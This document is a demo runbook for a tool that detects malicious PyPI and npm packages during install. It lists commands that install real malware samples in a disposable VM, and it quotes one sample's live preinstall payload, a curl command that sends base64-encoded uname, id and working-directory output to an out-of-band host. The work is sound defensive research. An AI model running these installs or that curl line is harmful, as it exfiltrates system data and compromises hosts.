# SCBF Demo — copy-paste commands

All commands run **on the Ubuntu VM**, in `~/scbf2`.

> ⚠️ **These packages really execute.** Only ever run them in the disposable VM.
> One benchmark sample planted an attacker SSH key in `~/.ssh/authorized_keys`
> during development. Never on your host, never anywhere holding credentials.

```bash
cd ~/scbf2
```

---

## 0. The two guards

| command | ecosystem | what it does |
|---|---|---|
| `sudo scbf-guard-pip install <x>` | PyPI | one install, monitored live, **killed mid-flight if malicious** |
| `sudo scbf-guard-npm install <x>` | npm | same, for `npm install` |
| `SCBF_DRY_RUN=1 sudo scbf-guard-pip install <x>` | — | decides but never kills |

**PyPI** decides at events **1500 / 2200 / 3000**, each with its own
validation-tuned threshold. **npm** decides at event **1500**.

Several decision points exist because a single 3000-event point is reached by
only 59% of installs — the rest finish first and would only be judged after the
payload had already run. Nothing useful exists before ~1200 events: that window
is the installer's own resolve/download/unpack, near-identical for every package
(ROC-AUC 0.57).

Held-out performance:

| | precision | recall | F1 |
|---|---|---|---|
| PyPI @3000 | 100.00% | 86.44% | 92.73% |
| PyPI @1500 | 100.00% | 79.66% | 88.68% |
| npm @1500 | 90.48% | 66.67% | 76.77% |

---

## 1. Malware — the install is KILLED mid-flight

**PyPI:**

```bash
sudo scbf-guard-pip install data/raw/pypi_malware/eepl-4.5.2.tar.gz
sudo scbf-guard-pip install data/raw/pypi_malware/pyghoster-1.0.0.tar.gz
sudo scbf-guard-pip install data/raw/pypi_malware/BeautifullSooup-1.0.0.tar.gz
```

Expected:

```
[guard] multi-window stage loaded: windows [1500, 2200, 3000] ...
[guard] event 1500: p(malicious)=1.0000 distance=11.002 -> BLOCK
[guard] TERMINATING installer process tree (pid 11916) at event 1500
[+] VERDICT        : BLOCKED — install terminated mid-flight
[!] INSTALLATION BLOCKED — terminated by the guard
[✗] BLOCKED — the installer was terminated before it finished.
```

**npm:**

```bash
sudo scbf-guard-npm install data/raw/npm_malware/207_eslint-plugin-cas-1.1.5.tgz
```

That package's `preinstall` is a live exfiltration payload:

```
/usr/bin/curl --data "$(uname -a|base64)--$(id|base64)--$(pwd|base64)" \
    $(hostname).eslint.<subdomain>.oastify.com
```

**Verify the block was real** — the package must be absent afterwards:

```bash
ls /tmp/scbf_install_env 2>/dev/null || echo "environment discarded — install did not persist"
```

---

## 2. Clean packages — expect ALLOW

Use **local artifacts** for the demo:

```bash
sudo scbf-guard-pip install data/raw/pypi_benign/katna-0.9.2.tar.gz
sudo scbf-guard-pip install data/raw/pypi_benign/pathml-2.1.1.tar.gz
sudo scbf-guard-npm install data/raw/npm_benign/pex-gl-3.0.0.tgz
```

Measured: **10/10 clean PyPI, 8/10 clean npm** allowed.

> ⚠️ **Do not demo `sudo scbf-guard-pip install requests`.** It is falsely
> blocked. Every benign training trace came from a local `.tar.gz`, so a real
> registry download looks like exfiltration. Measured 4/6 on registry installs —
> `requests` and `certifi` fail. This is a known defect; see README *Known
> limits*.

---

## 3. The ones it misses — show these too

```bash
sudo scbf-guard-pip install data/raw/pypi_malware/xpip-20.2.4.tar.gz
sudo scbf-guard-npm install data/raw/npm_malware/152_crypto_mintme-1.0.0.tgz
```

Live rates are **10/12 PyPI** and **6/10 npm**. Showing a miss is more
convincing than hiding it, and for npm there is a concrete reason: 26% of the
malicious packages declare no install hook at all, so they execute nothing
during installation and no install-time monitor can see them.

---

## 4. Dry run — decide without killing

```bash
SCBF_DRY_RUN=1 sudo scbf-guard-pip install data/raw/pypi_malware/eepl-4.5.2.tar.gz
```

Prints the verdict at each checkpoint and lets the install finish. Useful for
showing the probability climbing as evidence accumulates.

---

## 5. Reading the output

```
[guard] event 1500: p(malicious)=0.9810 distance=10.937 -> BLOCK
[guard] TERMINATING installer process tree (pid 11677) at event 1500
[+] VERDICT        : BLOCKED — install terminated mid-flight
```

| field | meaning |
|---|---|
| **event N** | the checkpoint at which this decision was taken |
| **p(malicious)** | model probability — **this drives the decision** |
| **distance** | envelope distance — corroborating only, `0.000` for npm (no envelope) |
| **verdict** | BLOCK kills the process tree; WARN is logged, install continues |

Thresholds are per checkpoint: PyPI 0.7997 @1500, 0.9425 @2200, 0.9568 @3000;
npm 0.6010 @1500. All tuned on validation, never on test.

---

## 6. If a verdict looks inconsistent

**The same package can block at a different checkpoint between runs**, or
occasionally not at all. Trace length varies run to run — `eepl` has blocked at
1500 and at 2200 on different runs. This is expected; re-run to confirm.

**If everything is suddenly allowed**, check the sinkhole:

```bash
getent hosts pypi.org              # must resolve to a real address
getent hosts evil.example.com      # must resolve to 203.0.113.1
ip addr show scbfsink              # must exist
```

The sinkhole must point at `203.0.113.1`, **not** `127.0.0.1`. The feature
extractor counts a contact as external only when it is off loopback/RFC1918, so
sinking to localhost makes `n_ext_connect` zero for every package and hides the
strongest malicious signal. That fault once made the guard allow known malware
at p=0.0000.

---

## 7. What to say when demoing

**What it does.** Captures install-time behaviour with eBPF, builds a temporal
graph incrementally as the install runs, and scores the *partial* graph with a
temporal graph network. No signatures, no rules, no threat feed.

**Why it is different.** Every comparable tool — OSCAR, Guarddog, Amalfi, SAP —
analyses the complete package and reports afterwards. SCBF decides while the
installer is still running and terminates it.

**The honest numbers.** PyPI 92.73% F1 against OSCAR's 91.00% on the same
benchmark. npm 76.77% against their 95.00% — SCBF loses there, because 26% of
npm malware executes nothing during installation.

**What not to claim.** That it beats everything; that it works on registry
installs today; that the TGN is the full Rossi et al. architecture (it is the
memory module only, no attention).
